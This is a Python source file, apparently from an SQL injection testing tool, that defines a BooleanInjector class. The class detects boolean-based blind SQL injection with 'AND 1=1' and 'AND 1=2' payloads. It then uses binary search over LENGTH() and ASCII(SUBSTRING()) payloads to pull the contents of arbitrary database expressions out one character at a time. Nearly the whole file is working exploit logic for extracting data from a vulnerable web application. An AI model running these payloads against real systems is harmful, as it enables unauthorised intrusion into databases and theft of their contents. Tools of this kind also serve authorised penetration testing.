from core.Requester import Requester
from core.Analyzer import Analyzer
from utils.constants import InjectionContext, differ_length_bool

class BooleanInjector:
	"""
	Detects Boolean-based SQL injection vulnerabilities.
	
	These vulnerabilities can allow attackers to infer database information
	by observing differences between true and false query conditions.
	"""

	def __init__(self, requester: Requester, analyzer: Analyzer):
		self.requester = requester
		self.analyzer = analyzer
  
	def test(self, url: str, param: str, ctx: InjectionContext) -> bool:
		"""
		Test for boolean-based SQL injection.

		Two payloads are sent: one with a condition that is always true and
		one with a condition that is always false. If the application's
		responses differ, the parameter is likely injectable.
		"""
  
		r_true = self.requester.send(
			url,
			{ param: f"{ctx.prefix}AND 1=1{ctx.suffix}" }
		)

		r_false = self.requester.send(
			url,
			{ param: f"{ctx.prefix}AND 1=2{ctx.suffix}" }
		)

		return self.analyzer.responses_differ(r_true, r_false, differ_length_bool)

	def get_expressions_name_length(
    	self, url: str, param: str, ctx: InjectionContext, expression: str
    ) -> int:
		"""
		Find the expression's name length using binary search
  		"""

		# Baseline for a query containing a false condition. If another response differs from this,
		# it would probably mean that the tested condition is true.
		r_false = self.requester.send(
			url,
			{ param: f"{ctx.prefix}AND 1=2{ctx.suffix}" }
		)

		# Initial range
		low = 0
		high = 64

		while low < high:
			# Integer division to calculate the middle value between low and high
			mid = (low + high) // 2

			# To check if the name length is higher to the current mid value
			payload = f"{ctx.prefix}AND LENGTH({expression})>{mid}{ctx.suffix}"
			response = self.requester.send(url, { param: payload })

			# If different then the condition is right
			if self.analyzer.responses_differ(r_false, response, differ_length_bool):
				low = mid + 1
			else:
				high = mid

		return low

	def get_expressions_name(
		self, url: str, param: str, ctx: InjectionContext, expression: str, expr_name_len: int
    ) -> str:
		expr_name = ""

		# Baseline for a query containing a false condition. If another response differs from this,
		# it would probably mean that the tested condition is true.
		r_false = self.requester.send(
			url,
			{ param: f"{ctx.prefix}AND 1=2{ctx.suffix}" }
		)

		for digit in range(1, expr_name_len + 1):
			low = 32
			high = 126

			while low < high:
				mid = (low + high) // 2

				payload = (
					f"{ctx.prefix}AND ASCII(SUBSTRING({expression},{digit},1))>{mid}{ctx.suffix}"
				)
				response = self.requester.send(url, { param: payload })

				# If different then the condition is right
				if self.analyzer.responses_differ(r_false, response, differ_length_bool):
					low = mid + 1
				else:
					high = mid

			expr_name += chr(low)

		return expr_name

	def get_expressions_name_chars_at_index(
		self,
  		url: str,
    	param: str,
     	ctx: InjectionContext,
		expression: str,
       	range: list[int]
    ) -> list[str]:
		"""
		Returns a given element's character at the given indexes by checking the
  		results of boolean blind tests.
  		"""
  
		found_chars: list[str] = []
		# Baseline for a query containing a false condition. If another response differs from this,
		# it would probably mean that the tested condition is true.
		r_false = self.requester.send(
			url,
			{ param: f"{ctx.prefix}AND 1=2{ctx.suffix}" }
		)

		for digit in range:
			# We will test against ASCII characters from number 32 (SPACE) to 126 (TILDE)
			low = 32
			high = 126
			while low < high:
				mid = (low + high) // 2

				payload = (
					f"{ctx.prefix}AND ASCII(SUBSTRING({expression},{digit},1))>{mid}{ctx.suffix}"
				)
				response = self.requester.send(url, { param: payload })

				# If different then the condition is right
				if self.analyzer.responses_differ(r_false, response, differ_length_bool):
					low = mid + 1
				else:
					high = mid

			found_chars.append(chr(low))

		return found_chars
